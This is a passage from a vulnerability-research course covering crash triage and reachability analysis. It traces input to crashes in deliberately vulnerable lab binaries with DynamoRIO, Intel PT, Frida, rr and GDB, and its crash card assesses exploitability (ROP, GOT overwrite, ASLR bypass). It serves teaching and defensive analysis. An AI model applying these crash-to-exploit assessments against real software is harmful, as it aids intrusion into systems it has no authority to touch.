| Element        | Controlled? | Evidence                          |
| -------------- | ----------- | --------------------------------- |
| Crash address  | Partial     | Offset from allocation controlled |
| Written value  | Yes         | Direct byte from input            |
| Size of access | Yes         | Length field in JSON              |
| Path to crash  | Direct      | parse_string()                    |

## Reachability Analysis

- **Input Vector**: File (JSON document)
- **Authentication Required**: No
- **User Interaction**: Yes (user opens file)
- **Attack Complexity**: Low

**Data Flow Summary**:

JSON file → parse_document() → parse_string() → memcpy() → overflow

## Active Mitigations

| Mitigation   | Status  | Bypass Complexity     |
| ------------ | ------- | --------------------- |
| ASLR/PIE     | On      | Need info leak        |
| Stack Canary | On      | Not applicable (heap) |
| NX/DEP       | On      | ROP for code exec     |
| RELRO        | Partial | GOT writable          |
| CFG/CFI      | Off     | N/A                   |

## Reproduction

- **Minimized Input**: crash_042_min.json
- **Input Size**: 89 bytes
- **SHA256**: a1b2c3d4e5f6...
- **Reproduction Rate**: 10/10

**Reproduction Command**:

```bash
./json_parser crash_042_min.json
```

## Recommended Priority

- [x] **HIGH**: Code execution with constraints

**Justification**: Heap overflow with controlled write value. Requires info leak
for ASLR bypass, but GOT overwrite possible. User interaction required (open file).
````

### Key Takeaways

1. **Automation is essential**: Manual triage of thousands of crashes is impractical
2. **Multiple tools provide confidence**: Agree classification increases confidence
3. **Deduplication saves time**: Focus on unique bugs, not duplicate crashes
4. **Exploitability guides priority**: EXPLOITABLE bugs warrant immediate attention
5. **Clustering reveals patterns**: Multiple crashes often share root cause
6. **Standardized reports**: Crash Cards make analysis professional and reproducible

### Discussion Questions

1. How reliable are automated exploitability assessments (CASR, Pwndbg checksec, !exploitable) compared to manual analysis?
2. What are the limitations of stack-hash based deduplication used by these tools?
3. Why might two crashes with different stack traces have the same root cause?
4. When would you choose CASR batch analysis over interactive Pwndbg debugging?

## Day 4: Reachability Analysis - Tracing Input to Crash

- **Goal**: Learn to trace user-controlled input from entry point to crash location.
- **Activities**:
  - _Reading_:
    - [Dynamic Binary Instrumentation](https://dynamorio.org/page_home.html)
  - _Online Resources_:
    - [Intel Processor Trace](https://github.com/intel/libipt)
    - [Taint Analysis Overview](https://users.ece.cmu.edu/~aavgerin/papers/Oakland10.pdf)
  - _Tool Setup_:
    - DynamoRIO with drcov
    - Lighthouse plugin for IDA/Binary Ninja
    - rr (record and replay debugger)
  - _Exercise_:
    - Trace HTTP request to crash in web server
    - Identify input propagation path

### Understanding Reachability Analysis

**What Is Reachability?**:

- Tracing how attacker-controlled input reaches vulnerable code
- Answering: "Can an attacker trigger this bug?"
- Essential for proving exploitability

**Why It Matters**:

- Bug in reachable code = vulnerability
- Bug in unreachable code = non-issue (for that attack surface)
- Determines attack complexity and prerequisites

**Methods**:

1. **Static Analysis**: Code review, call graph analysis
2. **Dynamic Analysis**: Runtime tracing, instrumentation
3. **Symbolic Execution**: Path exploration with constraints
4. **Hybrid**: Combine static and dynamic

### Coverage-Guided Reachability (DynamoRIO)

**DynamoRIO + drcov**:

- Dynamic binary instrumentation framework
- drcov module tracks code coverage
- Generates .drcov files for Lighthouse
- Works on binaries without source

**Installation**:

```bash
# Download and install DynamoRIO
cd ~/tools
wget https://github.com/DynamoRIO/dynamorio/releases/download/cronbuild-11.90.20452/DynamoRIO-Linux-11.90.20452.tar.gz
tar -xzf DynamoRIO-Linux-11.90.20452.tar.gz

# Set environment variables
export DYNAMORIO_HOME=~/tools/DynamoRIO-Linux-11.90.20452
export PATH=$DYNAMORIO_HOME/bin64:$PATH

# Test installation
drrun -root  ~/tools/DynamoRIO-Linux-11.90.20452 -- /usr/bin/ls
```

**Collecting Coverage**:

```bash
# Run target with drcov (crash input)
drrun -root  ~/tools/DynamoRIO-Linux-11.90.20452 -t drcov -- ~/crash_analysis_lab/vuln_asan 1 $(python3 -c "print('A'*200)")

# Output: drcov.vuln_asan.<pid>.0000.proc.log

# Run with benign input for comparison
drrun -root  ~/tools/DynamoRIO-Linux-11.90.20452 -t drcov -- ~/crash_analysis_lab/vuln_asan 1 $(python3 -c "print('A'*50)")

# Output: drcov.vuln_asan.<pid>.0000.proc.log
```

**Visualizing in Lighthouse** (IDA Pro / Binary Ninja):

```bash
# Load target binary in IDA/Binary Ninja
# Install Lighthouse plugin:
# IDA: File → Script file → lighthouse_plugin.py
# Binary Ninja: Tools → Manage Plugins → Install Lighthouse

# Load coverage file:
# File → Load file → drcov.target.12345.0000.proc.log

# View:
# - Red/uncolored: Not covered
# - Green: Covered
# - Gradient: Heatmap of execution frequency
```

**Differential Coverage**:

```bash
# Compare crash vs benign
# Lighthouse: Coverage → Diff Coverage
# Select baseline: drcov.target.12346.0000.proc.log (benign)
# Select compare: drcov.target.12345.0000.proc.log (crash)

# New blocks highlighted:
# - Shows code paths unique to crash
# - Identifies vulnerable code region
```

### Intel Processor Trace (PT)

**What Is Intel PT?**:

- Hardware-based execution tracing
- Records all branches taken by CPU
- Near-zero overhead (~5%)
- Requires supported CPU (Broadwell+)

**Check Support**:

```bash
cat /proc/cpuinfo | grep intel_pt
# Should show "intel_pt" in flags
```

> [!NOTE]
> Intel PT doesn't work inside VMs by default.
> For KVM/QEMU, the host kernel needs `CONFIG_KVM_INTEL_PT=y` and `kvm_intel pt_mode=1`.
> The VM also needs `intel_pt=on` in its CPU flags.
> If PT isn't available, use software-based alternatives like `perf record` with software events, or run PT workloads on bare metal.

**Intel PT Example: Tracing Stack Overflow to Crash**:

This example uses the `vuln_no_protect` binary from Day 1 to trace how input reaches the vulnerable `stack_overflow()` function:

```bash
cd ~/crash_analysis_lab

# Step 1: Record execution with crash input (test case 1 = stack overflow)
perf record -e intel_pt//u -o crash_trace.data ./vuln_no_protect 1 $(python3 -c "print('A'*200)")
# Program crashes with SIGSEGV, trace saved to crash_trace.data

# Step 2: Decode the trace to see all branches taken
perf script -i crash_trace.data --itrace=b > branches.txt
# Output shows every branch taken during execution

# Step 3: Find the crash point - last branches before crash
perf script -i crash_trace.data --itrace=b | grep "stack_overflow" | tail -5
# Example output:
#   vuln_no_protect  99261 [002] 19066.993908:  1  branches:u:  401225 stack_overflow+0x4f => 0 [unknown]
#
# NOTE: The target shows "0 [unknown]" instead of 0x4141414141414141 because Intel PT
# cannot record non-canonical addresses. When ret pops a corrupted return address like
# 0x4141414141414141, the CPU faults BEFORE completing the branch, so PT never logs
# the actual target. The "=> 0 [unknown]" indicates RIP control - use GDB to see the
# actual controlled value sitting at RSP when the crash occurs.

# Step 4: Convert to coverage for visualization
perf script -i crash_trace.data --itrace=i1000 -F ip > coverage.txt
# Lists instruction pointers hit during execution

# Step 5: Compare with benign input (no crash - input fits in buffer)
perf record -e intel_pt//u -o benign_trace.data ./vuln_no_protect 1 "short_input"
perf script -i benign_trace.data --itrace=i1000 -F ip > benign_coverage.txt

# Step 6: Find unique crash path (code only hit during overflow)
comm -23 <(sort -u coverage.txt) <(sort -u benign_coverage.txt) > crash_unique.txt
# Shows code blocks only hit during crash - helps identify the vulnerable path

# Step 7: Examine the unique addresses
cat crash_unique.txt | head -20
# These addresses can be loaded into IDA/Ghidra to highlight the crash-specific path
```

**Tracing Different Vulnerability Types**:

```bash
cd ~/crash_analysis_lab

# Trace heap overflow (test case 2)
perf record -e intel_pt//u -o heap_trace.data ./vuln_no_protect 2 $(python3 -c "print('B'*100)")
perf script -i heap_trace.data --itrace=b | grep -E "heap_overflow|strcpy"
# Shows entry into heap_overflow(), the strcpy call that causes the overflow, and return

# Trace UAF (test case 3) - Note: may not crash without ASAN
perf record -e intel_pt//u -o uaf_trace.data ./vuln_no_protect 3
perf script -i uaf_trace.data --itrace=b | grep -A5 "use_after_free"
# Shows the free() followed by the dangling pointer access

# Trace double-free (test case 4)
perf record -e intel_pt//u -o df_trace.data ./vuln_no_protect 4
perf script -i df_trace.data --itrace=b | grep "free"
# Shows both free() calls to the same pointer
```

**Using libipt for Custom Analysis**:

```bash
# Install libipt
sudo apt install libipt-dev

# Example: Decode PT trace programmatically
# See: https://github.com/intel/libipt/blob/master/doc/howto_libipt.md
```

### Frida-Based Tracing (Alternative for Closed-Source)

When DynamoRIO isn't available or you need cross-platform tracing, **Frida** provides dynamic instrumentation without recompilation. This is especially useful for analyzing crashes in binaries where you don't have source code.

**Installation**:

```bash
cd ~/crash_analysis_lab
source .venv/bin/activate
pip install frida-tools
```

**Basic Function Tracing with Lab Binaries**:

> [!NOTE]
> The functions in `vuln_no_protect` (like `stack_overflow`, `heap_overflow`, etc.) are **not exported symbols** - they're internal functions. `Module.findExportByName()` won't find them, but Frida can resolve them automatically using `DebugSymbol.fromName()` if the binary has symbols (not stripped).

```javascript
// trace_vuln_suite.js - Trace calls to vulnerable_suite functions
// Save to ~/crash_analysis_lab/trace_vuln_suite.js
//
// Frida resolves symbol addresses automatically - no manual nm lookup needed!

const targetFuncs = [
  "stack_overflow",
  "heap_overflow",
  "use_after_free",
  "double_free",
  "null_deref",
];

// Hook binary functions by symbol name (works if binary has symbols)
targetFuncs.forEach(function (funcName) {
  // DebugSymbol.fromName() finds internal symbols that findExportByName() can't
  const sym = DebugSymbol.fromName(funcName);

  if (sym.address.isNull()) {
    console.log(`[-] Symbol not found: ${funcName} (binary might be stripped)`);
    return;
  }

  try {
    Interceptor.attach(sym.address, {
      onEnter: function (args) {
        console.log(`[*] ${funcName} called`);
        console.log(
          `    Backtrace:\n` +
            Thread.backtrace(this.context, Backtracer.ACCURATE)
              .map(DebugSymbol.fromAddress)
              .join("\n"),
        );
      },
      onLeave: function (retval) {
        console.log(`[*] ${funcName} returned`);
      },
    });
    console.log(`[+] Hooked ${funcName} at ${sym.address}`);
  } catch (e) {
    console.log(`[-] Could not hook ${funcName}: ${e}`);
  }
});

// Hook libc functions AFTER libraries are loaded
// When using frida -f (spawn mode), libc isn't loaded yet at script init time
setTimeout(function () {
  const libc = Process.getModuleByName("libc.so.6");
  console.log(`[*] libc base: ${libc.base}`);

  ["strcpy", "memcpy", "free", "malloc"].forEach(function (func) {
    const addr = libc.findExportByName(func);
    if (addr) {
      Interceptor.attach(addr, {
        onEnter: function (args) {
          console.log(`[LIBC] ${func}(${args[0]})`);
        },
      });
      console.log(`[+] Hooked libc ${func} at ${addr}`);
    }
  });
}, 0);
```

> [!TIP]
> **For stripped binaries**: If `DebugSymbol.fromName()` returns null addresses, the binary was compiled without symbols (`-s` flag) or stripped with `strip`. In that case, you'll need to get addresses manually with `nm` (before stripping) or reverse engineer them with Ghidra/IDA.

**Running Frida Traces with Lab Binaries**:

```bash
cd ~/crash_analysis_lab
source .venv/bin/activate

# Trace stack overflow (test case 1)
frida -f ./vuln_no_protect -l trace_vuln_suite.js -- 1 $(python3 -c "print('A'*200)")

# Expected output:
# [+] Hooked stack_overflow at 0x4011d6
# [+] Hooked heap_overflow at 0x401226
# [+] Hooked use_after_free at 0x40129c
# [+] Hooked double_free at 0x401334
# [+] Hooked null_deref at 0x401393
# [*] libc base: 0x7a0ddde00000
# [+] Hooked libc strcpy at 0x7a0dddf8b530
# [+] Hooked libc memcpy at 0x7a0dddf88a40
# [+] Hooked libc free at 0x7a0dddeadd30
# [+] Hooked libc malloc at 0x7a0dddead650
# [*] stack_overflow called
#     Backtrace:
#     0x40151e vuln_no_protect!main /home/dev/crash_analysis_lab/src/vulnerable_suite.c:65:64
#     0x7a0ddde2a1ca libc.so.6!0x2a1ca
#     0x7a0ddde2a28b libc.so.6!__libc_start_main+0x8b
#     0x401115 vuln_no_protect!_start+0x25
# [LIBC] malloc(0x400)
# [LIBC] strcpy(0x7ffce2462ee0)
# [LIBC] memcpy(...)
# Process terminated                <- Crashes before onLeave (stack smashed)

# Trace UAF (test case 3)
frida -f ./vuln_no_protect -l trace_vuln_suite.js -- 3

# Expected output shows the UAF pattern:
# [*] use_after_free called
#     Backtrace:
#     0x40154c vuln_no_protect!main /home/dev/crash_analysis_lab/src/vulnerable_suite.c:67:35
# [LIBC] malloc(0x40)
# [LIBC] free(0x355933c0)           <- Memory freed here
# [LIBC] memcpy(...)                <- Accesses after free
# [*] use_after_free returned
# Process terminated
```

**Key Lessons**:

1. **`DebugSymbol.fromName()`**: Resolves internal function symbols automatically (no manual `nm` needed)
2. **`findExportByName()`**: Only works for dynamically exported symbols (libc, shared libs)
3. **Defer libc hooks with `setTimeout`**: When using `-f` (spawn mode), libraries aren't loaded at script init time
4. **Stripped binaries**: If symbols are stripped, you'll need manual address resolution via reverse engineering

**Memory Access Tracing** (Find what reads your input):

```javascript
// trace_memory.js - Watch memory region for access
// Save to ~/crash_analysis_lab/trace_memory.js

// This script watches for memory accesses to track taint flow
// Run with: frida -f ./vuln_no_protect -l trace_memory.js -- 1 AAAA...

var inputPattern = "AAAA"; // Pattern to search for

// Defer hooking until libc is loaded (required for spawn mode with -f)
setTimeout(function () {
  var libc = Process.getModuleByName("libc.so.6");
  var strcpyAddr = libc.findExportByName("strcpy");

  if (!strcpyAddr) {
    console.log("[-] Could not find strcpy");
    return;
  }

  // Hook strcpy to find where our input lands
  Interceptor.attach(strcpyAddr, {
    onEnter: function (args) {
      this.dest = args[0];
      this.src = args[1];
      try {
        var srcStr = args[1].readCString();
        if (srcStr && srcStr.indexOf(inputPattern) !== -1) {
          console.log(`[TAINT] strcpy copying tainted data!`);
          console.log(`    dest: ${this.dest}`);
          console.log(`    src:  ${this.src}`);
          console.log(`    data: ${srcStr.substring(0, 50)}...`);
          console.log(
            Thread.backtrace(this.context, Backtracer.ACCURATE)
              .map(DebugSymbol.fromAddress)
              .join("\n"),
          );
        }
      } catch (e) {}
    },
    onLeave: function (retval) {
      // After strcpy, we know where our input is in memory
      if (this.dest) {
        console.log(`[TAINT] Input now at ${this.dest}`);
      }
    },
  });
  console.log(`[+] Hooked strcpy at ${strcpyAddr}`);
}, 0);
```

**Complete Reachability Analysis Script**:

```python
#!/usr/bin/env python3
"""
frida_reachability.py - Trace data flow from input to crash
Save to ~/crash_analysis_lab/frida_reachability.py

Usage:
    cd ~/crash_analysis_lab
    source .venv/bin/activate
    python3 frida_reachability.py 1 $(python3 -c "print('A'*200)")
"""
import frida
import sys
import os

# JavaScript to inject - tracks data flow through vulnerable_suite
# Note: In spawn mode with Python API, process is suspended after spawn,
# so libc is already loaded when we attach - no setTimeout needed.
js_code = """
// Track data flow from input to crash
var inputAddr = null;
var inputSize = 0;
var taintedAddrs = [];

var libc = Process.getModuleByName("libc.so.6");

// Hook strcpy - the actual vulnerable operation
var strcpyAddr = libc.findExportByName("strcpy");
if (strcpyAddr) {
    Interceptor.attach(strcpyAddr, {
        onEnter: function(args) {
            this.dest = args[0];
            this.src = args[1];
            console.log(`\\n[SINK] strcpy called`);
            console.log(`    dest: ${this.dest}`);
            console.log(`    src:  ${this.src}`);

            // Check if source is our tainted input
            if (inputAddr && this.src.compare(inputAddr) >= 0 &&
                this.src.compare(inputAddr.add(inputSize)) <= 0) {
                console.log(`    [!] TAINTED DATA REACHING SINK!`);
                console.log(Thread.backtrace(this.context, Backtracer.ACCURATE)
                    .map(DebugSymbol.fromAddress).join('\\n'));
            }
        }
    });
    console.log(`[+] Hooked strcpy at ${strcpyAddr}`);
}

// Hook free for UAF tracking
var freeAddr = libc.findExportByName("free");
if (freeAddr) {
    Interceptor.attach(freeAddr, {
        onEnter: function(args) {
            console.log(`\\n[FREE] free(${args[0]})`);
            taintedAddrs.push(args[0].toString());
        }
    });
    console.log(`[+] Hooked free at ${freeAddr}`);
}

// Hook malloc to track allocations
var mallocAddr = libc.findExportByName("malloc");
if (mallocAddr) {
    Interceptor.attach(mallocAddr, {
        onEnter: function(args) {
            this.size = args[0].toInt32();
        },
        onLeave: function(retval) {
            console.log(`[ALLOC] malloc(${this.size}) = ${retval}`);
        }
    });
    console.log(`[+] Hooked malloc at ${mallocAddr}`);
}

// Hook vulnerable functions by symbol name
["stack_overflow", "heap_overflow"].forEach(function(func) {
    var sym = DebugSymbol.fromName(func);
    if (!sym.address.isNull()) {
        Interceptor.attach(sym.address, {
            onEnter: function(args) {
                console.log(`\\n[VULN] Entering ${func}`);
                console.log(`    arg0 (input): ${args[0]}`);
                try {
                    console.log(`    value: ${args[0].readCString().substring(0, 50)}...`);
                } catch(e) {}
            }
        });
        console.log(`[+] Hooked ${func} at ${sym.address}`);
    }
});

// Hook main to capture argv
var mainSym = DebugSymbol.fromName("main");
if (!mainSym.address.isNull()) {
    Interceptor.attach(mainSym.address, {
        onEnter: function(args) {
            var argc = args[0].toInt32();
            var argv = args[1];
            console.log(`[*] main() called with ${argc} arguments`);

            if (argc >= 3) {
                // argv[2] is our input for test cases 1 and 2
                var inputPtr = argv.add(16).readPointer();  // argv[2]
                try {
                    var inputStr = inputPtr.readCString();
                    inputAddr = inputPtr;
                    inputSize = inputStr.length;
                    console.log(`[INPUT] Captured input at ${inputPtr}: ${inputStr.substring(0, 50)}...`);
                    console.log(`[INPUT] Size: ${inputSize} bytes`);
                } catch(e) {}
            }
        }
    });
    console.log(`[+] Hooked main at ${mainSym.address}`);
}
"""

def on_message(message, data):
    if message['type'] == 'send':
        print(f"[Frida] {message['payload']}")
    elif message['type'] == 'error':
        print(f"[Error] {message['stack']}")

def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <test_case> [input]")
        print(f"Example: {sys.argv[0]} 1 $(python3 -c \"print('A'*200)\")")
        sys.exit(1)

    os.chdir(os.path.expanduser("~/crash_analysis_lab"))

    # Build command line
    args = ["./vuln_no_protect"] + sys.argv[1:]

    print(f"[*] Spawning: {' '.join(args)}")

    device = frida.get_local_device()
    pid = device.spawn(args)
    session = device.attach(pid)

    script = session.create_script(js_code)
    script.on('message', on_message)
    script.load()

    print("[*] Script loaded, resuming process...")
    device.resume(pid)

    # Wait for process to finish (it will crash)
    try:
        session.on('detached', lambda reason: print(f"[*] Detached: {reason}"))
        input("[*] Press Enter to detach (or wait for crash)...")
    except KeyboardInterrupt:
        pass

    print("[*] Done")

if __name__ == "__main__":
    main()
```

**Running the Reachability Script**:

```bash
cd ~/crash_analysis_lab
source .venv/bin/activate

# Trace stack overflow - shows input flowing to strcpy sink
python3 frida_reachability.py 1 $(python3 -c "print('A'*200)")

# Expected output:
# [*] Spawning: ./vuln_no_protect 1 AAAA...
# [+] Hooked strcpy at 0x70b804b8b530
# [+] Hooked free at 0x70b804aadd30
# [+] Hooked malloc at 0x70b804aad650
# [+] Hooked stack_overflow at 0x4011d6
# [+] Hooked heap_overflow at 0x401226
# [+] Hooked main at 0x401485
# [*] Script loaded, resuming process...
# [*] main() called with 3 arguments
# [INPUT] Captured input at 0x7fffefb52398: AAAA...
# [INPUT] Size: 200 bytes
#
# [VULN] Entering stack_overflow
#     arg0 (input): 0x7fffefb52398
#     value: AAAA...
#
# [ALLOC] malloc(1024) = 0x1644d3c0
#
# [SINK] strcpy called
#     dest: 0x7fffefb50950
#     src:  0x7fffefb52398
#     [!] TAINTED DATA REACHING SINK!
#     0x401208 vuln_no_protect!stack_overflow /home/dev/crash_analysis_lab/src/vulnerable_suite.c:10:5
#     0x40151e vuln_no_protect!main /home/dev/crash_analysis_lab/src/vulnerable_suite.c:65:64
#     0x70b804a2a1ca libc.so.6!0x2a1ca
#     0x70b804a2a28b libc.so.6!__libc_start_main+0x8b
#     0x401115 vuln_no_protect!_start+0x25
# [*] Detached: process-terminated
# [*] Done

# Trace UAF
python3 frida_reachability.py 3

# Expected output shows malloc -> free -> use pattern:
# [+] Hooked strcpy at 0x7ed72838b530
# [+] Hooked free at 0x7ed7282add30
# [+] Hooked malloc at 0x7ed7282ad650
# [+] Hooked stack_overflow at 0x4011d6
# [+] Hooked heap_overflow at 0x401226
# [+] Hooked main at 0x401485
# [*] Script loaded, resuming process...
# [*] main() called with 2 arguments
# [ALLOC] malloc(64) = 0x15a873c0       <- Chunk allocated
# [ALLOC] malloc(1024) = 0x15a87410
# [FREE] free(0x15a873c0)               <- Chunk freed
# [*] UAF read: Z                       <- Access after free!
# [*] Detached: process-terminated
```

### Record and Replay Debugging (rr)

**What Is rr?**:

- Records program execution deterministically
- Replays execution in GDB
- Allows reverse execution (step backward!)
- Perfect for analyzing non-deterministic bugs and tracing data flow

**Installation**:

```bash
cd ~/tuts/
# sudo apt remove rr
git clone --depth https://github.com/rr-debugger/rr.git
cd rr
mkdir build && cd build
sudo apt-get install ccache cmake make g++-multilib gdb lldb \
  pkg-config coreutils python3-pexpect manpages-dev git \
  ninja-build capnproto libcapnp-dev zlib1g-dev libzstd-dev
cmake -DPYTHON_EXECUTABLE=/usr/bin/python3 -DCMAKE_BUILD_TYPE=Release -Ddisable32bit=On ..
make -j$(nproc)
sudo make install

# IMPORTANT: Check system requirements
# rr depends on access to hardware performance counters (PMU).
# Newer rr + kernel combinations may require fewer sysctl changes.
# In VMs, you may need to enable PMU passthrough; otherwise consider the [rr.soft fork](https://github.com/sidkshatriya/rr.soft) (much slower).

# Check CPU features (verifies rr can work with your CPU)
rr cpufeatures
# Should output CPU feature flags to disable for deterministic replay

# If recording fails with perf_event permission issues:
cat /proc/sys/kernel/perf_event_paranoid
# If value is > 1, you may need to lower it (SYSTEM-WIDE, affects all users):
echo 1 | sudo tee /proc/sys/kernel/perf_event_paranoid

# Verify setup by recording a simple command
rr record /bin/ls
# Should show: "rr: Saving execution to trace directory..."
```

**Recording and Replaying Lab Binaries**:

```bash
cd ~/crash_analysis_lab

# Record stack overflow crash (test case 1)
rr record ./vuln_no_protect 1 $(python3 -c "print('A'*200)")
# Output:
# rr: Saving execution to trace directory `/home/user/.local/share/rr/vuln_no_protect-0'.

# Recording saved in ~/.local/share/rr/

# Replay in GDB with full time-travel capability
rr replay

# Now in GDB with reverse execution:
(gdb) continue          # Run forward to crash
# Program received signal SIGSEGV, Segmentation fault.
# 0x0000000000401225 in stack_overflow (...) at vulnerable_suite.c:11
# The crash occurs at the `ret` instruction trying to return to 0x4141414141414141
# RBP and return address are overwritten with 'A's (0x41)

(gdb) reverse-continue  # Go backward to previous signal/breakpoint
# Note: If SIGSEGV is the only event, this returns to the same crash point
# Use reverse-step/reverse-next to actually step backward through execution

(gdb) reverse-step      # Step backward one instruction (into functions)
(gdb) reverse-next      # Step over backward (skip function internals)
# Note: First reverse-step from crash may stay at same point, keep stepping
```

**Tracing Stack Overflow with rr**:

```bash
cd ~/crash_analysis_lab

# Step 1: Record the crash
rr record ./vuln_no_protect 1 $(python3 -c "print('A'*200)")

# Step 2: Replay and analyze
rr replay

# In GDB/Pwndbg:
(gdb) continue
# Crashes at ret instruction (0x401225) trying to return to 0x4141414141414141
# RIP points to the `ret`, stack shows overwritten return address

# Step 3: Use reverse-next to trace back through execution
(gdb) reverse-step
# May stay at crash point initially

(gdb) reverse-next
# Steps back to line 10 (after strcpy, before printf)
# Now at 0x401208 - you can see buffer already contains 'AAAA...'
# RBP is already corrupted: 0x4141414141414141

# Step 4: Set breakpoint and replay from start to catch corruption in action
(gdb) break stack_overflow
(gdb) run                # rr replays from beginning (back to _start)
(gdb) continue           # Hit the breakpoint
# Breakpoint 1, stack_overflow (input=0x7ffea8d6e8fe "AAA...") at vulnerable_suite.c:8

# Step 5: Now buffer is in scope - examine stack layout and save return address
(gdb) print &buffer
# $1 = (char (*)[64]) 0x7fff9aeb3a90

(gdb) info frame
# Shows: Saved registers: rbp at 0x7fff9aeb3ad0, rip at 0x7fff9aeb3ad8

(gdb) set $retaddr = $rbp + 8     # Save return address location to variable
(gdb) print/x $retaddr
# $2 = 0x7fff9aeb3ad8             # Verify it matches "rip at" from info frame

# Step 6: Break at strcpy call (avoids PLT resolution noise)
(gdb) break *0x401203             # Break right before strcpy@plt call
(gdb) continue
# Breakpoint hit at strcpy call - PLT for puts already resolved

# Step 7: Set watchpoint on saved return address and continue into strcpy
(gdb) watch *(long*)$retaddr      # Use saved variable
(gdb) continue
# Watchpoint triggers when strcpy overwrites the return address!

# Hardware watchpoint hit:
# Old value = 4199710                  # 0x40151e = main+153 (original return addr)
# New value = 4702111234474983745      # 0x4141414141414141 = 'AAAAAAAA'
# __strcpy_avx2 () at ../sysdeps/x86_64/multiarch/strcpy-avx2.S:198

# Step 8: Examine where we are - inside strcpy during the overflow
(gdb) bt
# #0  __strcpy_avx2 ()
# #1  stack_overflow (input=...) at vulnerable_suite.c:9
# #2  0x4141414141414141 in ?? ()   <-- Return address already corrupted!
```

**Tracing Use-After-Free with rr**:

```bash
cd ~/crash_analysis_lab

# Record UAF (test case 3)
rr record ./vuln_no_protect 3

# Replay and set watchpoint on heap allocation
rr replay

(gdb) break use_after_free
(gdb) continue
# Breakpoint hit at use_after_free()

(gdb) next  # Step to malloc
(gdb) next  # ptr = malloc(64)
(gdb) print ptr
# $1 = 0x1a1772a0 "Hello, World!"

# Watch this memory location
(gdb) watch *ptr
(gdb) continue
# Watchpoint triggers inside _int_free() at tcache_put()
# Old value = 72 'H'  (first byte of "Hello, World!")
# New value = 119 'w' (glibc overwrites with tcache metadata)
# This is the free() corrupting our data with freelist pointers

(gdb) continue
# Watchpoint triggers on UAF access!
# Old value = 119 'w'
# New value = 88 'X'
# Program read corrupted data - tcache pointer instead of original string

# Go back to find the exact UAF access
(gdb) reverse-continue
# Watchpoint triggers in reverse - takes us back to the UAF write!
# Old value = 88 'X'
# New value = 38 '&'
# RIP = 0x40132e (use_after_free+146) ◂— mov byte ptr [rax], 0x58
# Now we're at the exact instruction that wrote to freed memory

(gdb) bt
# #0  0x40132e in use_after_free () at vulnerable_suite.c:30  <- UAF write
# #1  main () at vulnerable_suite.c:67

# Continue reversing to find the free()
(gdb) reverse-continue
# Takes us back to tcache_put() inside _int_free()
# This is where the memory was freed
```

**Tracing Double-Free with rr**:

```bash
cd ~/crash_analysis_lab

# Record double-free (test case 4)
rr record ./vuln_no_protect 4

rr replay

(gdb) break free
(gdb) continue
# First free() call
(gdb) bt
# #0  free () ...
# #1  double_free () at vulnerable_suite.c:...

(gdb) continue
# Second free() call - CRASH or glibc detection
(gdb) bt
# Same pointer being freed again!

# Go back to see the first free
(gdb) reverse-continue
# Now at first free() - can examine state before corruption
```

#### rr vs TTD: When to Use Which

| Feature                | rr (Linux)                  | TTD (Windows)                 |
| ---------------------- | --------------------------- | ----------------------------- |
| **Platform**           | Linux only                  | Windows only                  |
| **Recording overhead** | ~5-10x                      | ~10-20x                       |
| **Trace size**         | Moderate                    | Large (GBs for long runs)     |
| **Query capability**   | Basic (GDB commands)        | Advanced (Data Model queries) |
| **Reverse execution**  | Full support                | Full support                  |
| **Multi-threaded**     | Yes (chaos mode for races)  | Yes                           |
| **Kernel debugging**   | No                          | No (user-mode only)           |
| **ARM64 support**      | Yes (v5.6+)                 | No (x64 only)                 |
| **IDE integration**    | VSCode (Midas), GDB         | WinDbg Preview                |
| **Best for**           | Linux apps, race conditions | Windows apps, complex queries |

**Decision Guide**:

- Analyzing Linux crash? → Use **rr**
- Analyzing Windows crash? → Use **TTD**
- Need to query "when did X change"? → TTD's data model is more powerful
- Hunting race conditions? → rr's chaos mode
- Limited resources/VM? → rr has lower overhead

**Don't use rr for**:

- Windows targets (use TTD instead)
- Kernel debugging (use KGDB/crash instead)
- Performance-sensitive recording (use Intel PT for lightweight tracing)
- GUI applications (high overhead on X11/Wayland)

### Taint Analysis Concepts

**What Is Taint Analysis?**:

- Mark input data as "tainted"
- Track taint propagation through execution
- Identify if crash involves tainted data

**Taint Sources** (where data comes from):

- Network input (recv, read from socket)
- File input (read, fread)
- User input (scanf, gets)
- Command-line arguments (argv)
- Environment variables (getenv)

**Taint Sinks** (where vulnerabilities occur):

- Memory operations (memcpy, strcpy)
- System calls (exec, system)
- Control flow (indirect jumps, function pointers)

**Manual Taint Tracking** (with GDB):

```bash
# Set breakpoint at input read
(gdb) break read
(gdb) run
# Breakpoint hit

# Note buffer address
(gdb) print buffer
$1 = 0x7fffffffe000

# Watch this memory
(gdb) watch *(long*)0x7fffffffe000

# Continue and see all accesses
(gdb) continue
# Watchpoint triggered at each use

# Build mental map of taint flow:
# read() → buffer → parse_header() → struct->field → vulnerable_function()
```

**Automated Taint Analysis** (Advanced):

Tools like Triton, libdft, or QEMU-based taint trackers can automate this,
but setup is complex. Manual analysis sufficient for most cases.

### Call Graph Analysis (Static Approach)

**Using IDA Pro**:

```bash
# View → Open subviews → Proximity browser
# Select function: handle_request
# View call graph

# Shows:
# main() → accept_connection() → handle_request() → process_header() → [CRASH]

# Right-click → Xrefs graph to
# Shows all paths to vulnerable function
```

**Using Ghidra**:

```bash
# Window → Function Call Graph
# Right-click function → Show Function Call Tree
# Trace from entry points (main, exported functions)
# to vulnerable function
```

**Scripting Call Graph** (IDA Python):

- as a task write a script to visualize or print call graph

### Ghidra Scripting for Crash Analysis

Ghidra's scripting capabilities are powerful for automating crash analysis tasks. Unlike IDA which requires a license, Ghidra is free and supports both Python (via Jython) and Java scripts.

**Basic Crash Context Script** (Python/Jython):

- fix the following script to make it work as you want

```python
# crash_context.py - Analyze crash location context
# Run via: Ghidra → Script Manager → Run

from ghidra.program.model.symbol import RefType
from ghidra.program.model.block import BasicBlockModel

def analyze_crash_location(crash_addr_str):
    """Analyze the context around a crash address"""

    crash_addr = toAddr(crash_addr_str)
    func = getFunctionContaining(crash_addr)

    if func is None:
        print("[!] Crash address not in a function")
        return

    print("=" * 60)
    print(f"Crash Analysis: {crash_addr_str}")
    print("=" * 60)

    # Function info
    print(f"\n[+] Function: {func.getName()}")
    print(f"    Entry: {func.getEntryPoint()}")
    print(f"    Size: {func.getBody().getNumAddresses()} bytes")

    # Get instruction at crash
    instr = getInstructionAt(crash_addr)
    if instr:
        print(f"\n[+] Crash Instruction:")
        print(f"    {crash_addr}: {instr}")

    # Find references TO this location (who calls/jumps here?)
    print(f"\n[+] References to crash location:")
    refs_to = getReferencesTo(crash_addr)
    for ref in refs_to:
